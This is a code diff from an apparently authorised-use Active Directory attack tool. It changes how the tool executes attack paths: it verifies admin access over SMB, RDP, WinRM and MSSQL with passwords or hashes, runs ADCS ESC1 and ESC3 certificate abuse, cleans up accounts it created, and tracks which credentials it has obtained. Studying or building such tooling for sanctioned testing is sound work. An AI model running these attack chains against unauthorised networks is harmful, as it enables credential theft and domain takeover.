+            print_warning(f"[rollback] LDAP fallback delete raised: {exc}")
+
+    if not deleted:
+        print_warning(
+            f"[rollback] Could not delete {marked_user} — manual cleanup required: "
+            f"net user {target_user} /delete /domain"
+        )
+
+
+def _check_hassession_pending_cleanup(shell: Any, *, domain: str) -> None:
+    """Offer to clean up a HasSession artifact left by a previous crashed run.
+
+    Call this at the start of any domain scan so abandoned accounts are
+    surfaced before new exploitation begins.
+    """
+    import json as _json
+
+    workspace_dir = _resolve_workspace_dir(shell, domain)
+    if not workspace_dir:
+        return
+    checkpoint_path = os.path.join(
+        workspace_dir, "domains", domain, "hassession_cleanup_pending.json"
+    )
+    if not os.path.exists(checkpoint_path):
+        return
+    try:
+        with open(checkpoint_path, encoding="utf-8") as fh:
+            data: dict[str, Any] = _json.load(fh)
+    except (OSError, ValueError) as exc:
+        telemetry.capture_exception(exc)
+        return
+
+    if data.get("rollback_done"):
+        _clear_hassession_cleanup_checkpoint(shell, domain=domain)
+        return
+
+    target_user = str(data.get("target_user") or "")
+    created_at = str(data.get("created_at") or "")
+    if not target_user:
+        return
+
+    marked = mark_sensitive(target_user, "user")
+    marked_domain = mark_sensitive(domain, "domain")
+    print_warning(
+        f"[rollback] Pending HasSession cleanup detected: "
+        f"{marked} @ {marked_domain} (created {created_at}). "
+        "Run 'adscan cleanup hassession' or execute cleanup now."
+    )
+
+    if is_non_interactive(shell):
+        return
+
+    from rich.prompt import Confirm
+
+    if Confirm.ask("Execute cleanup now?", default=True):
+        _run_hassession_rollback(
+            shell,
+            domain=domain,
+            exec_username=str(data.get("exec_username") or ""),
+            exec_password=str(data.get("exec_password") or ""),
+            target_host=str(data.get("target_host") or ""),
+            session_user=str(data.get("session_user") or ""),
+            target_user=target_user,
+            target_password=data.get("target_password"),
+            user_created_by_us=bool(data.get("user_created_by_us", True)),
+            group_candidates=list(data.get("group_candidates") or []),
+            non_interactive=True,
+        )
+        _clear_hassession_cleanup_checkpoint(shell, domain=domain)
+
+
 def _is_user_domain_admin_via_sid(
     shell: Any,
     *,
@@ -3942,6 +5169,397 @@ def _attempt_post_adminto_credential_harvest(
     )
 
 
+# ---------------------------------------------------------------------------
+# Network probe — UX display and stale-snapshot advisory
+# ---------------------------------------------------------------------------
+
+_PROBE_STATUS_STYLE: dict[str, tuple[str, str]] = {
+    "open": ("[bold green]open[/bold green]", ""),
+    "closed": (
+        "[bold yellow]closed[/bold yellow]",
+        "  [dim]host up · port closed[/dim]",
+    ),
+    "filtered": ("[bold red]filtered[/bold red]", "  [dim]host offline[/dim]"),
+}
+
+_SERVICE_LABEL: dict[str, str] = {
+    "smb": "SMB",
+    "rdp": "RDP",
+    "winrm": "WinRM",
+    "mssql": "MSSQL",
+    "dcom": "DCOM",
+}
+
+
+def _print_probe_result(result: TCPProbeResult) -> None:
+    """Print a compact one-line probe result with tactical styling."""
+    from rich.console import Console
+
+    status_markup, annotation = _PROBE_STATUS_STYLE.get(
+        result.status, (result.status, "")
+    )
+    Console(highlight=False).print(
+        f"  [dim]◈[/dim]  [cyan]{result.host}[/cyan][dim]:{result.port}[/dim]"
+        f"  →  {status_markup}  [dim]{result.elapsed_ms:.0f}ms[/dim]{annotation}"
+    )
+
+
+def _show_stale_snapshot_advisory(
+    *,
+    target_label: str,
+    matched_ips: list[str],
+    ports: list[int],
+    service_key: str,
+) -> None:
+    """Show the advisory panel when the vantage catalog marks a host as unreachable."""
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.text import Text as RichText
+
+    ip_str = matched_ips[0] if matched_ips else "—"
+    port_str = ", ".join(str(p) for p in ports)
+    svc_str = _SERVICE_LABEL.get(service_key, service_key.upper())
+
+    body = (
+        f"  Target    [bold]{target_label}[/bold]  [dim]·[/dim]  [dim]{ip_str}[/dim]\n"
+        f"  Port      [bold cyan]{port_str}/tcp[/bold cyan]  [dim]({svc_str})[/dim]\n"
+        f"  Catalog   [yellow]unreachable[/yellow]  [dim]· snapshot may be outdated[/dim]\n\n"
+        "  Workstations get powered off, VMs migrate, firewalls change.\n"
+        "  A live probe confirms the current state before discarding this step."
+    )
+    Console(highlight=False).print(
+        Panel(
+            RichText.from_markup(body),
+            title="[dim]◈[/dim]  Stale Snapshot — Live Connectivity Check",
+            border_style="yellow",
+            padding=(0, 2),
+        )
+    )
+
+
+def _run_stale_snapshot_probe(
+    *,
+    target_label: str,
+    matched_ips: list[str],
+    action: str,
+) -> TCPProbeResult | None:
+    """
+    Advisory flow for a host the catalog marks as unreachable.
+
+    Shows the stale-snapshot panel, asks the operator if they want a fresh
+    probe, runs it, and returns:
+      - TCPProbeResult if the operator said yes.
+      - None if the operator declined or no port is known for this action.
+    """
+    from rich.console import Console
+    from rich.prompt import Confirm
+
+    ports = action_to_service_ports(action)
+    if not ports:
+        return None
+
+    from adscan_internal.services.network_probe_service import ACTION_TO_SERVICE
+
+    service_key = ACTION_TO_SERVICE.get(action.lower().strip(), "")
+
+    target_ip = matched_ips[0] if matched_ips else ""
+    if not target_ip:
+        return None
+
+    _show_stale_snapshot_advisory(
+        target_label=target_label,
+        matched_ips=matched_ips,
+        ports=ports,
+        service_key=service_key,
+    )
+
+    try:
+        do_probe = Confirm.ask(
+            "  [dim]▸[/dim]  Run live connectivity probe?",
+            default=True,
+            console=Console(highlight=False),
+        )
+    except (EOFError, KeyboardInterrupt):
+        do_probe = False
+
+    if not do_probe:
+        return None
+
+    result = run_async_sync(tcp_probe_multi(target_ip, ports, timeout=5.0))
+    _print_probe_result(result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# Attack-step verification: failure reason taxonomy
+# ---------------------------------------------------------------------------
+
+
+class _VerifyFailReason(str, Enum):
+    OK = "ok"
+    HOST_OFFLINE = "host_offline"  # network / port unreachable
+    SERVICE_DOWN = "service_down"  # host up, but specific service port closed/disabled
+    NO_PRIVILEGE = "no_privilege"  # authenticated OK, access denied
+    AUTH_FAILED = "auth_failed"  # credentials rejected
+    UNKNOWN = "unknown"
+
+
+_SERVICE_PORTS: dict[str, list[int]] = {
+    "smb": [445],
+    "rdp": [3389],
+    "winrm": [5985, 5986],
+    "mssql": [1433],
+}
+
+
+def _map_detail_to_reason(service: str, detail: str) -> _VerifyFailReason:
+    """Derive a structured failure reason from the verify_detail tag."""
+    d = detail.lower()
+    # SMB
+    if "smb_status=unreachable" in d or "smb_status=error" in d:
+        return _VerifyFailReason.HOST_OFFLINE
+    if "smb_status=not_admin" in d:
+        return _VerifyFailReason.NO_PRIVILEGE
+    if "smb_status=auth_failed" in d:
+        return _VerifyFailReason.AUTH_FAILED
+    # WinRM
+    if "winrm_avail=port_closed" in d:
+        return _VerifyFailReason.SERVICE_DOWN
+    if "winrm_avail=auth_failed" in d:
+        return _VerifyFailReason.AUTH_FAILED
+    if "winrm_avail=unknown" in d:
+        return _VerifyFailReason.UNKNOWN
+    # RDP
+    if "rdp_verdict=error" in d:
+        return _VerifyFailReason.HOST_OFFLINE
+    if "rdp_verdict=false" in d:
+        return _VerifyFailReason.NO_PRIVILEGE
+    # MSSQL
+    if "mssql_no_login" in d:
+        return _VerifyFailReason.SERVICE_DOWN
+    if "mssql_login_failed" in d:
+        return _VerifyFailReason.AUTH_FAILED
+    if "mssql_sysadmin=false" in d:
+        return _VerifyFailReason.NO_PRIVILEGE
+    if "verify_error=" in d:
+        return _VerifyFailReason.HOST_OFFLINE
+    return _VerifyFailReason.UNKNOWN
+
+
+def _show_verify_failure_panel(
+    *,
+    action: str,
+    host: str,
+    reason: _VerifyFailReason,
+    username: str,
+) -> None:
+    """Display a premium-UX failure panel explaining WHY the verify step failed."""
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.text import Text as RichText
+
+    console = Console(highlight=False)
+    marked_host = mark_sensitive(host, "hostname")
+    marked_user = mark_sensitive(username, "user")
+
+    if reason == _VerifyFailReason.HOST_OFFLINE:
+        title = f"[bold yellow]{action} — Host Unreachable[/bold yellow]"
+        body = (
+            f"[bold]{marked_host}[/bold] is not responding on any required protocol port.\n\n"
+            "Common causes:\n"
+            "  · The machine was [bold]powered off[/bold] (workstation offline, laptop closed)\n"
+            "  · Host-based firewall blocking the port from this vantage\n"
+            "  · Host disconnected from the network during the engagement\n\n"
+            "[dim]The edge is preserved in the graph — not discarded due to a temporary outage.[/dim]\n"
+            "[dim]Status updated to:[/dim] [yellow]unavailable[/yellow]"
+        )
+        border = "yellow"
+
+    elif reason == _VerifyFailReason.SERVICE_DOWN:
+        title = f"[bold yellow]{action} — Service Unavailable[/bold yellow]"
+        body = (
+            f"Host [bold]{marked_host}[/bold] is reachable on the network but the service is closed.\n\n"
+            "Common causes:\n"
+            "  · Service disabled by GPO or hardening (e.g. WinRM disabled)\n"
+            "  · Port filtered by an application-layer firewall\n"
+            "  · Service stopped manually during the engagement\n\n"
+            "[dim]The edge is preserved — the access may be executable through a different vector.[/dim]\n"
+            "[dim]Status updated to:[/dim] [yellow]unavailable[/yellow]"
+        )
+        border = "yellow"
+
+    elif reason == _VerifyFailReason.NO_PRIVILEGE:
+        title = f"[bold red]{action} — Privileges Not Confirmed[/bold red]"
+        body = (
+            f"[bold]{marked_user}[/bold] authenticated successfully on [bold]{marked_host}[/bold]\n"
+            "but [bold]does not hold administrative access[/bold] to the required resource.\n\n"
+            "Likely causes:\n"
+            "  · Group membership was revoked since the last enumeration\n"
+            "  · The graph edge is [bold]stale[/bold] and no longer reflects reality\n"
+            "  · The privilege exists but requires prior elevation on the host\n\n"
+            "[dim]Status updated to:[/dim] [red]failed[/red]  "
+            "[dim]· Edge flagged as failed for manual review.[/dim]"
+        )
+        border = "red"
+
+    elif reason == _VerifyFailReason.AUTH_FAILED:
+        title = f"[bold orange1]{action} — Authentication Failed[/bold orange1]"
+        body = (
+            f"Credentials for [bold]{marked_user}[/bold] were rejected by [bold]{marked_host}[/bold].\n\n"
+            "Most common causes:\n"
+            "  · Password or hash rotated since capture\n"
+            "  · NTLM blocked by GPO — try a Kerberos ticket instead\n"
+            "  · Account locked, disabled, or expired\n\n"
+            "[dim]The edge is preserved — this is a credential issue, not a privilege issue.[/dim]\n"
+            "[dim]Status updated to:[/dim] [orange1]attempted[/orange1]"
+        )
+        border = "orange1"
+
+    else:
+        title = f"[bold]{action} — Unexpected Error[/bold]"
+        body = (
+            f"The native verifier returned an unclassified error against [bold]{marked_host}[/bold].\n\n"
+            "[dim]Check the debug logs for the full detail.[/dim]\n"
+            "[dim]Status updated to:[/dim] [yellow]unavailable[/yellow]"
+        )
+        border = "dim"
+
+    console.print(
+        Panel(
+            RichText.from_markup(body),
+            title=title,
+            border_style=border,
+            padding=(1, 2),
+        )
+    )
+
+
+async def _verify_attack_step_native(
+    *,
+    service: str,
+    require_admin: bool,
+    domain: str,
+    username: str,
+    secret: str,
+    is_hash: bool,
+    target_host: str,
+    target_hostname: str | None = None,
+    kdc_ip: str | None = None,
+) -> tuple[bool, _VerifyFailReason, str]:
+    """Native access verifier for AdminTo / SqlAccess / SqlAdmin / CanRDP / CanPSRemote.
+
+    Replaces the legacy ``netexec <service>`` Pwn3d! probe with the
+    async native stack: aiosmb (SMB), aardwolf (RDP), winrm async backend
+    and impacket TDS via :class:`ImpacketMSSQLBackend` (MSSQL).
+
+    Returns ``(ok, reason, detail)``:
+      - ``ok`` is True only when the relation is actively confirmed.
+      - ``reason`` is a ``_VerifyFailReason`` classifying WHY it failed.
+      - ``detail`` is a short machine-readable tag for debug logs.
+    """
+    # Pre-flight TCP probe — fail fast (3s) before committing to a full auth attempt
+    # that may time out after 15s. Distinguishes host-offline from service-down
+    # so the failure panel shows the correct reason without waiting.
+    probe_ports = SERVICE_PROBE_PORTS.get(service, [])
+    if probe_ports:
+        probe = await tcp_probe_multi(target_host, probe_ports, timeout=3.0)
+        _print_probe_result(probe)
+        if probe.status == "filtered":
+            detail = f"{service}_preflight=filtered_port={probe.port}"
+            return False, _VerifyFailReason.HOST_OFFLINE, detail
+        if probe.status == "closed":
+            detail = f"{service}_preflight=closed_port={probe.port}"
+            return False, _VerifyFailReason.SERVICE_DOWN, detail
+        # "open" → proceed with full auth attempt below
+
+    try:
+        if service == "smb":
+            result = await verify_domain_user_local_admin(
+                domain=domain,
+                username=username,
+                credential=secret,
+                host=target_host,
+                target_hostname=target_hostname,
+                kdc_ip=kdc_ip,
+            )
+            detail = f"smb_status={result.status.value}"
+            ok = result.status == SMBPrivilegeStatus.ADMIN
+            reason = (
+                _VerifyFailReason.OK if ok else _map_detail_to_reason(service, detail)
+            )
+            return ok, reason, detail
+
+        if service == "mssql":
+            backend = ImpacketMSSQLBackend(host=target_host)
+            if require_admin:
+                sweep = await asyncio.to_thread(
+                    backend.sweep_privileges,
+                    domain=domain,
+                    username=username,
+                    secret=secret,
+                )
+                if sweep is None:
+                    detail = "mssql_no_login"
+                    return False, _map_detail_to_reason(service, detail), detail
+                detail = f"mssql_sysadmin={sweep.is_sysadmin}"
+                ok = bool(sweep.is_sysadmin)
+                reason = (
+                    _VerifyFailReason.OK
+                    if ok
+                    else _map_detail_to_reason(service, detail)
+                )
+                return ok, reason, detail
+            identity = await asyncio.to_thread(
+                backend.fingerprint_identity,
+                domain=domain,
+                username=username,
+                secret=secret,
+            )
+            if identity is not None:
+                return True, _VerifyFailReason.OK, "mssql_login_ok"
+            detail = "mssql_login_failed"
+            return False, _map_detail_to_reason(service, detail), detail
+
+        if service == "rdp":
+            results = await scan_rdp_hosts(
+                [target_host],
+                domain=domain,
+                username=username,
+                secret=secret,
+                is_hash=is_hash,
+                dc_ip=kdc_ip,
+            )
+            verdict = results[0].verdict if results else "ERROR"
+            detail = f"rdp_verdict={verdict}"
+            ok = verdict in ("TRUE", "MAYBE")
+            reason = (
+                _VerifyFailReason.OK if ok else _map_detail_to_reason(service, detail)
+            )
+            return ok, reason, detail
+
+        if service == "winrm":
+            availability = await probe_winrm_available(
+                target_host,
+                domain=domain,
+                username=username,
+                password=secret,
+                kerberos_spn_host=target_hostname,
+            )
+            detail = f"winrm_avail={availability}"
+            ok = availability == "available"
+            reason = (
+                _VerifyFailReason.OK if ok else _map_detail_to_reason(service, detail)
+            )
+            return ok, reason, detail
+
+        detail = f"unsupported_service={service}"
+        return False, _VerifyFailReason.UNKNOWN, detail
+    except Exception as exc:  # noqa: BLE001 — never propagate to attack-path loop
+        telemetry.capture_exception(exc)
+        detail = f"verify_error={type(exc).__name__}"
+        return False, _VerifyFailReason.HOST_OFFLINE, detail
+
+
 def execute_selected_attack_path(
     shell: Any,
     domain: str,
@@ -3954,12 +5572,62 @@ def execute_selected_attack_path(
     """Execute a selected attack path (best-effort).
 
     Currently supported step mappings:
-    - AllowedToDelegate -> `shell.enum_delegations_user`
+    - AllowedToDelegate -> `exploit_delegation_constrained` (native S4U via kerbad)
 
     Returns:
         True if an execution attempt was started, False otherwise.
     """
+    # --- Boundary enforcement: re-apply the readiness gate ---
+    # Any caller may pass a raw (un-annotated) summary. We re-annotate here so
+    # the reachability and credential gate is evaluated exactly once at the
+    # execution boundary, regardless of whether the caller already ran it.
+    # This is intentionally idempotent: annotate_summary_execution_readiness
+    # returns the same dict if meta is already populated.
+    summary = annotate_summary_execution_readiness(
+        shell,
+        domain=domain,
+        summary=summary,
+        context_username=context_username,
+        context_password=context_password,
+    )
+    _gate_meta = summary.get("meta") or {}
+    _gate_status = str(_gate_meta.get("execution_support_status") or "").strip().lower()
+    if _gate_status in {"unsupported", "blocked"}:
+        _gate_reason = str(_gate_meta.get("execution_support_reason") or "").strip()
+        print_warning(
+            "ADscan refuses to execute this attack path: "
+            + (_gate_reason or "execution is not supported from the current vantage.")
+        )
+        _gate_advisory = str(
+            _gate_meta.get("execution_target_execution_advisory") or ""
+        ).strip()
+        if _gate_advisory:
+            print_info(_gate_advisory)
+        # When the block is due to host unreachability, offer the same pivot
+        # follow-up the listing flow offers — a single canonical UX point so
+        # any future entry point triggering the gate gets the offer too.
+        _gate_viability_status = (
+            str(_gate_meta.get("execution_target_viability_status") or "")
+            .strip()
+            .lower()
+        )
+        _gate_target_label = str(_gate_meta.get("execution_target_label") or "").strip()
+        if _gate_target_label and _gate_viability_status:
+            maybe_offer_pivot_opportunity_for_host_viability(
+                shell,
+                domain=domain,
+                blocked_target=_gate_target_label,
+                viability_status=_gate_viability_status,
+                operator_summary=None,
+            )
+        return False
+    # --- End boundary enforcement ---
+
     set_attack_path_execution(shell)
+    # Surface any HasSession artifact left by a previous crashed run before
+    # starting new exploitation — keeps the domain clean and alerts the operator.
+    _check_hassession_pending_cleanup(shell, domain=domain)
+
     local_cleanup_scope_id: str | None = None
     cleanup_scope_owner = False
     try:
@@ -4029,6 +5697,64 @@ def execute_selected_attack_path(
                     to_label=to_label,
                     status=desired_status,
                     notes={"blocked_kind": kind, "reason": reason},
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+
+        def _handle_failed_adcs_step(
+            action: str,
+            from_label: str,
+            to_label: str,
+            *,
+            notes: dict[str, Any],
+        ) -> None:
+            """Mark an ADCS step as failed and surface a warning to the operator."""
+            try:
+                update_edge_status_by_labels(
+                    shell,
+                    domain,
+                    from_label=from_label,
+                    relation=action,
+                    to_label=to_label,
+                    status="failed",
+                    notes=notes,
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+            marked_from = mark_sensitive(from_label, "user")
+            marked_to = mark_sensitive(to_label, "user")
+            marked_domain = mark_sensitive(domain, "domain")
+            print_warning(
+                f"Path stopped: {action} did not obtain a certificate for "
+                f"{marked_from} → {marked_to} on {marked_domain}. "
+                "Downstream steps will not execute."
+            )
+
+        def _handle_successful_adcs_step(
+            action: str,
+            from_label: str,
+            to_label: str,
+            *,
+            notes: dict[str, Any],
+        ) -> None:
+            """Mark an ADCS step as success.
+
+            Symmetric counterpart to ``_handle_failed_adcs_step``. ESC handlers
+            set the edge to ``attempted`` before calling ``run_esc_sync``;
+            without this transition on success, the edge would stay at
+            ``attempted`` even after the cert was issued and PKINIT extracted
+            the target NT hash — making the attack-path UI show a green chain
+            with one stuck-yellow node in the middle.
+            """
+            try:
+                update_edge_status_by_labels(
+                    shell,
+                    domain,
+                    from_label=from_label,
+                    relation=action,
+                    to_label=to_label,
+                    status="success",
+                    notes=notes,
                 )
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
@@ -4336,18 +6062,39 @@ def execute_selected_attack_path(
                 else (get_last_ace_execution_outcome(shell) or {})
             )
             outcome_key = str(effective_outcome.get("key") or "").strip().lower()
+            step_context = get_attack_path_step_context(shell)
+            terminal_class = (
+                str(step_context.get("target_terminal_class") or "").strip().lower()
+            )
+            is_direct_compromise_credential = (
+                outcome_key == "user_credential_obtained"
+                and terminal_class == "direct_compromise"
+            )
             marked_outcome_domain = mark_sensitive(domain, "domain")
             print_info_debug(
                 "[attack_paths] outcome follow-up evaluation: "
                 f"domain={marked_outcome_domain} pivot={is_pivot_search!r} "
-                f"outcome_key={mark_sensitive(str(outcome_key or 'none'), 'detail')}"
+                f"outcome_key={mark_sensitive(str(outcome_key or 'none'), 'detail')} "
+                f"terminal_class={mark_sensitive(terminal_class or 'none', 'detail')}"
             )
-            should_evaluate_outcome_followups = is_pivot_search or outcome_key in {
-                "rbcd_prepared",
-                "rodc_host_access_prepared",
-            }
+            should_evaluate_outcome_followups = (
+                is_pivot_search
+                or outcome_key in {
+                    "rbcd_prepared",
+                    "rodc_host_access_prepared",
+                    # Group membership was changed via GenericAll/GenericWrite/AddMember.
+                    # The added user may now access new hosts/shares — probe them while
+                    # they're still in the group; cleanup rollback fires in the finally
+                    # block AFTER these followups complete.
+                    "group_membership_changed",
+                }
+                or is_direct_compromise_credential
+            )
             if should_evaluate_outcome_followups:
-                if outcome_key != "user_credential_obtained":
+                if (
+                    outcome_key != "user_credential_obtained"
+                    or is_direct_compromise_credential
+                ):
                     outcome_followups = build_followups_for_execution_outcome(
                         shell,
                         outcome=effective_outcome,
@@ -4425,6 +6172,32 @@ def execute_selected_attack_path(
                 f"nested_followup_active={bool(followup_context)!r} "
                 f"context={mark_sensitive(str(followup_context or {}), 'detail')}"
             )
+
+            # Centralised active-step success transition. Any action that
+            # produces a ``user_credential_obtained`` outcome (ESC1..15 PKINIT,
+            # GenericAll/WriteOwner/AddKeyCredentialLink shadow-creds path,
+            # kerberoasting, AS-REP roasting, secretsdump, etc.) converges
+            # here. Without this, every handler would need to remember to
+            # update the edge status manually on success and a future ESC16
+            # would silently leave the edge stuck on "attempted".
+            try:
+                from adscan_internal.services.attack_graph_runtime_service import (
+                    update_active_step_status,
+                )
+
+                source_action = str(outcome.get("source_action") or "").strip()
+                update_active_step_status(
+                    shell,
+                    domain=domain,
+                    status="success",
+                    notes={
+                        "compromised_user": compromised_user,
+                        "credential_type": str(outcome.get("credential_type") or ""),
+                        "source_action": source_action,
+                    },
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
 
         def _mark_step_implicitly_satisfied(
             *,
@@ -4812,32 +6585,27 @@ def execute_selected_attack_path(
                     "canpsremote": "winrm",
                 }
                 service = service_map[key]
+                require_admin = key in {"adminto", "sqladmin"}
 
-                if not hasattr(shell, "run_service_command"):
-                    print_warning(
-                        "Cannot execute this step: NetExec privilege checker is unavailable."
-                    )
-                    _mark_blocked_step(
-                        action,
-                        from_label,
-                        to_label,
-                        kind="unavailable",
-                        reason="Execution helper unavailable (NetExec missing)",
-                    )
-                    return execution_started
+                try:
+                    is_hash = bool(shell.is_hash(password))
+                except Exception:  # noqa: BLE001
+                    is_hash = False
 
-                auth = shell.build_auth_nxc(
-                    exec_username, password, domain, kerberos=False
+                kdc_ip: str | None = None
+                try:
+                    kdc_ip = resolve_dc_ip(
+                        (getattr(shell, "domains_data", {}) or {}).get(domain, {}) or {}
+                    )
+                except Exception:  # noqa: BLE001
+                    kdc_ip = None
+
+                marked_user = mark_sensitive(exec_username, "user")
+                marked_target = mark_sensitive(target_host, "hostname")
+                print_info_verbose(
+                    f"Verifying {action} on {marked_target} as {marked_user} "
+                    f"via native {service} probe."
                 )
-                log_file = (
-                    f"domains/{domain}/{service}/verify_{exec_username}_{service}.log"
-                )
-                netexec_timeout_seconds = get_recommended_internal_timeout(service)
-                command = (
-                    f"{shell.netexec_path} {service} {target_host} {auth} "
-                    f"--timeout {netexec_timeout_seconds} --log {log_file}"
-                )
-                print_info_verbose(f"Command: {command}")
 
                 execution_started = True
                 _record_attack_path_execution_event(
@@ -4876,22 +6644,59 @@ def execute_selected_attack_path(
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
-                    ok = shell.run_service_command(
-                        command,
-                        domain,
-                        service,
-                        exec_username,
-                        password,
-                        return_boolean=True,
+                    ok, verify_reason, verify_detail = run_async_sync(
+                        _verify_attack_step_native(
+                            service=service,
+                            require_admin=require_admin,
+                            domain=domain,
+                            username=exec_username,
+                            secret=password,
+                            is_hash=is_hash,
+                            target_host=target_host,
+                            target_hostname=target_host,
+                            kdc_ip=kdc_ip,
+                        )
+                    )
+                    print_info_debug(
+                        f"[attack_paths] native {service} verifier: {verify_detail} reason={verify_reason.value}"
                     )
                     if not ok:
-                        marked_host = mark_sensitive(target_host, "hostname")
+                        # Edge status depends on WHY it failed, not just that it failed.
+                        # HOST_OFFLINE / SERVICE_DOWN → keep edge as "unavailable" (temporary)
+                        # NO_PRIVILEGE → "failed" (potentially stale edge)
+                        # AUTH_FAILED  → "attempted" (credential issue, not an edge issue)
+                        edge_status_on_fail = {
+                            _VerifyFailReason.HOST_OFFLINE: "unavailable",
+                            _VerifyFailReason.SERVICE_DOWN: "unavailable",
+                            _VerifyFailReason.NO_PRIVILEGE: "failed",
+                            _VerifyFailReason.AUTH_FAILED: "attempted",
+                            _VerifyFailReason.UNKNOWN: "unavailable",
+                        }.get(verify_reason, "failed")
+
+                        try:
+                            update_edge_status_by_labels(
+                                shell,
+                                domain,
+                                from_label=from_label,
+                                relation=action,
+                                to_label=to_label,
+                                status=edge_status_on_fail,
+                                notes={
+                                    "username": exec_username,
+                                    "target": target_host,
+                                    "fail_reason": verify_reason.value,
+                                    "verify_detail": verify_detail,
+                                },
+                            )
+                        except Exception as exc:  # noqa: BLE001
+                            telemetry.capture_exception(exc)
+
                         _record_attack_path_execution_event(
                             shell,
                             domain=domain,
                             summary=summary,
                             event_stage="step_failed",
-                            message=f"{action} did not confirm access on {to_label or target_host}.",
+                            message=f"{action} did not confirm access on {to_label or target_host}. Reason: {verify_reason.value}.",
                             step_index=idx,
                             total_steps=total_executable_steps,
                             executable_step_index=executable_step_position,
@@ -4899,13 +6704,16 @@ def execute_selected_attack_path(
                             action=action,
                             from_label=from_label,
                             to_label=to_label,
-                            step_status="failed",
+                            step_status=edge_status_on_fail,
                             actor=exec_username,
                             target_host=target_host,
-                            reason="access_not_confirmed",
+                            reason=verify_reason.value,
                         )
-                        print_warning(
-                            f"{action} check did not confirm access on {marked_host}. Stopping this path."
+                        _show_verify_failure_panel(
+                            action=action,
+                            host=target_host,
+                            reason=verify_reason,
+                            username=exec_username,
                         )
                         return True
 
@@ -5258,6 +7066,7 @@ def execute_selected_attack_path(
                                 str(strategy_notes.get("next_step_target_user") or ""),
                                 str(strategy_notes.get("generated_password") or ""),
                                 prompt_for_user_privs_after=False,
+                                credential_origin="writelogonscript",
                             )
                         _attempt_writelogonscript_cleanup_if_ready(
                             shell,
@@ -5513,6 +7322,9 @@ def execute_selected_attack_path(
                     return False
 
                 execution_started = True
+                ace_result: bool | None = (
+                    None  # sentinel — safe to check after try/except
+                )
                 _record_attack_path_execution_event(
                     shell,
                     domain=domain,
@@ -5658,6 +7470,38 @@ def execute_selected_attack_path(
                         initial_followups=followups,
                         last_outcome=last_outcome,
                     )
+
+                # Abort remaining path steps when this step definitively failed.
+                # A False result means the exploit ran and was rejected — the
+                # target state required by the next step was never established.
+                if ace_result is False:
+                    marked_action = action
+                    marked_target = mark_sensitive(to_label or "", "node")
+                    print_warning(
+                        f"[dim]Step {executable_step_position}/{total_executable_steps}[/dim] "
+                        f"[bold]{marked_action}[/bold] on {marked_target} failed — "
+                        "remaining path steps skipped."
+                    )
+                    _record_attack_path_execution_event(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        event_stage="path_aborted",
+                        message=(
+                            f"{action} failed on {to_label}; "
+                            "subsequent steps require this to succeed and were skipped."
+                        ),
+                        step_index=idx,
+                        total_steps=total_executable_steps,
+                        executable_step_index=executable_step_position,
+                        last_executable_idx=last_executable_idx,
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_status="aborted",
+                        actor=exec_context.exec_username,
+                    )
+                    break
 
                 continue
 
@@ -6161,7 +8005,10 @@ def execute_selected_attack_path(
                     action="ADCSESC1",
                     from_label=from_label,
                     to_label=to_label,
-                    notes={"username": exec_username, "template": template},
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
                 ):
                     try:
                         update_edge_status_by_labels(
@@ -6171,18 +8018,17 @@ def execute_selected_attack_path(
                             relation="ADCSESC1",
                             to_label=to_label,
                             status="attempted",
-                            notes={"username": exec_username, "template": template},
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
                         )
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
-                    if hasattr(shell, "adcs_esc1"):
-                        shell.adcs_esc1(  # type: ignore[attr-defined]
-                            domain, exec_username, password, template
-                        )
-                    else:
-                        from adscan_internal.cli.adcs_exploitation import adcs_esc1
+                    from adscan_internal.cli.adcs_exploitation import adcs_esc1
 
+                    esc1_success = bool(
                         adcs_esc1(
                             shell,
                             domain=domain,
@@ -6190,6 +8036,18 @@ def execute_selected_attack_path(
                             password=password,
                             template=template,
                         )
+                    )
+                    if not esc1_success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC1",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
                 continue
 
             if key == "adcsesc3":
@@ -6270,6 +8128,11 @@ def execute_selected_attack_path(
                     role="agent",
                 )
                 if esc3_agent_templates:
+                    from adscan_internal.cli.adcs_exploitation import _resolve_template_cn
+
+                    esc3_agent_templates = [
+                        _resolve_template_cn(shell, domain, t) for t in esc3_agent_templates
+                    ]
                     marked = ", ".join(
                         mark_sensitive(template_name, "service")
                         for template_name in esc3_agent_templates
@@ -6322,6 +8185,12 @@ def execute_selected_attack_path(
                     details,
                     role="target",
                 )
+                if esc3_target_templates:
+                    from adscan_internal.cli.adcs_exploitation import _resolve_template_cn
+
+                    esc3_target_templates = [
+                        _resolve_template_cn(shell, domain, t) for t in esc3_target_templates
+                    ]
                 if not esc3_target_templates:
                     esc3_target_templates = ["User"]
                 default_target_idx = 0
@@ -6348,7 +8217,7 @@ def execute_selected_attack_path(
                     to_label=to_label,
                     notes={
                         "username": exec_username,
-                        "template": agent_template,
+                        "template_used_for_run": agent_template,
                         "client_auth_template": client_auth_template,
                     },
                 ):
@@ -6362,24 +8231,16 @@ def execute_selected_attack_path(
                             status="attempted",
                             notes={
                                 "username": exec_username,
-                                "template": agent_template,
+                                "template_used_for_run": agent_template,
                                 "client_auth_template": client_auth_template,
                             },
                         )
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
-                    if hasattr(shell, "adcs_esc3"):
-                        shell.adcs_esc3(  # type: ignore[attr-defined]
-                            domain,
-                            exec_username,
-                            password,
-                            agent_template,
-                            client_auth_template=client_auth_template,
-                        )
-                    else:
-                        from adscan_internal.cli.adcs_exploitation import adcs_esc3
+                    from adscan_internal.cli.adcs_exploitation import adcs_esc3
 
+                    esc3_success = bool(
                         adcs_esc3(
                             shell,
                             domain=domain,
